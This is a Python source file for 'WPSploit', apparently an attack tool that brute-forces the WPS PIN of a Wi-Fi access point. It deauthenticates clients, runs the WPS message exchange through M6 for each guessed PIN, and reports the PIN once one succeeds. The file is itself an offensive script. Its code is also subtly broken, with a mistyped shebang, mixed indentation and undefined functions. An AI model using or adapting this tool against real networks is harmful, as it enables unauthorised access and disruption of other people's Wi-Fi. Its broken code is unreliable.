#! /usr/bin/ev python

import sys
import os
from time import sleep, strftime
import argparse
import logging
import threading
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *
from core.wps import WPS
from core.wpscrypto import WpsCrypto
from core.wireless import Wireless
from twisted.internet import reactor
from pprint import pprint

if os.geteuid() != 0:
	sys.exit("Run me as r00t")

parser = argparse.ArgumentParser(description='WPSploit')
parser.add_argument('-i', type=str, dest='interface', help='Interface to use')
parser.add_argument('-e', type=str, dest='essid', help='Specify a ESSID')
parser.add_argument('-b', type=str, dest='bssid', help='Specify a BSSID')
parser.add_argument('-c', type=str, dest='channel', help='Specify a channel')
parser.add_argument('-p', type=str, dest='start_pin', default='00000000', help='start pin for brute force')
group = parser.add_mutually_exclusive_group(required=False)
group.add_argument('-P', dest='passive', action='store_true', default=False, help='Use passive mode [default]')
group.add_argument('-S', dest='scan', action='store_true', default=False, help='Use scan mode')
group.add_argument('-r', type=str, dest='pcap', help='Read pcap file')

args = parser.parse_args()


class EventHandler(object):
    
    verbose = None
    client_mac = None
    bssid = None
    ssid = None
    secret_number = None
    timeout_time = None
    pin = None
	got_fist_half = False
	done = False
	request_EAP_id = 0
	rcved = None

	#has_retry = False

	def event_handler(self):

		while not self.done:
			self.rcved_auth_response = False
			self.rcved_asso_response = False
			self.rcved_eap_request_identity = False
			self.rcved_m1 = False
			self.rcved_m3 = False
			self.rcved_m5 = False
			self.m4_sent = False

			self.has_auth_failed = False
			self.has_timeout = False
			#self.has_retry = False
			
			print 'Trying', self.pin    
				
			frames.send_deauth()

			frames.send_deauth()
			time.sleep(0.05)
			self.gen_pin()

	def auth_req(self):
		while not self.rcved_auth_response:
			print '-> 802.11 authentication request'    
			frames.send_auth(args.bssid)
			sleep(0.05)

	def asso_req(self):
		while not self.rcved_asso_response:
			print '-> 802.11 association request'
			frames.send_asso_req()
			sleep(0.05)

	def eapol_start(self):
		while not self.rcved_eapol_start_resp:
			print '-> EAPOL start'
			frames.send_eapol_start()
			sleep(0.05)

	def eapol_identity(self):
		while not self.rcved_eap_request_identity:
			print '-> EAP response identity'
			response_identity[EAP].id = self.request_EAP_id
			frames.send_response_identity()

	def handle_M1(self):
		print "<- M1"

	def M2(self):
		while not self.rcved_m1:
			print '-> M2'
			frames.send_M2()

	def handle_M3(self):
		print "<- M3"

	def M4(self):
		while not self.rcved_m3:
			print '-> M4'
			frames.send_M4()
			self.m4_sent = True

	def handle_M5(self):
		print '<- M5'

	def M6(self):
		while not self.rcved_m5:
			print '-> M6'
			frames.send_M6()

	def handle_M7(self):
		# juice
		print '-------------------------- FOUND PIN: %s --------------------------' % self.pin
		self.done = True

	def sniffer_thread(self, packet):
		if packet.haslayer(Dot11) and (packet[Dot11].addr1 == self.client_mac) and (packet[Dot11].addr3 == args.bssid):

			if (packet.haslayer(Dot11Auth) and not packet[Dot11Auth].status):
				print '<- 802.11 authentication response'
				self.rcved_auth_response = True

			elif (packet.haslayer(Dot11AssoResp) and not packet[Dot11AssoResp].status):
				print '<- 802.11 association response'
				self.rcved_asso_response = True

			elif (packet.haslayer(EAP) and packet[EAP].code == 1):
				self.request_EAP_id = packet[EAP].id

				if packet[EAP].type == 254: #Type: Expanded Type
					message = wps.parse_message(packet)

				elif packet[EAP].type == 1:
					print '<- EAP request identity'
					if not self.rcved_eap_request_identity:
						self.rcved_eap_request_identity = True
				else:
					print 'got unknown EAP message:'
					print packet.command()

def passive_mode(packet):
	info = wps.parse_info(packet)
	if info['bssid'] not in access_points:
		access_points.append(info['bssid'])
		pprint(info)

def scan_mode(packet):
	if packet.haslayer(Dot11ProbeResp):
		info = wps.parse_info(packet)
		probed_access_points.append(info['bssid'])
		pprint(info)
	elif info['bssid'] not in (access_points and probed_access_points):
		access_points.append(info['bssid'])
		frames.send_probereq(info['bssid'])

def cracking_mode(self):
	sniff(prn=wps.sniffer_thread, iface=args.interface)



if __name__ == '__main__':

	access_points = []
	probed_access_points = []

	wps = WPS()

	frames = Wireless()

	wpscrypto = WpsCrypto()

	if args.passive:
		sniff(prn=passive_mode, iface=args.interface)
	elif args.scan:
		sniff(prn=scan_mode, iface=args.interface)
	elif args.pcap:
		pcap = rdpcap(args.pcap)
		for packet in pcap:
			info = wps.parse_info(packet)
			if info['bssid'] not in access_points:
				access_points.append(info['bssid'])
				pprint(info)

	else:
		sniffer_thread = threading.Thread(target=cracking_mode)
		sniffer_thread.setDaemon(True)
		sniffer_thread.start()

		reactor.callWhenRunning(start_loops)
		reactor.run()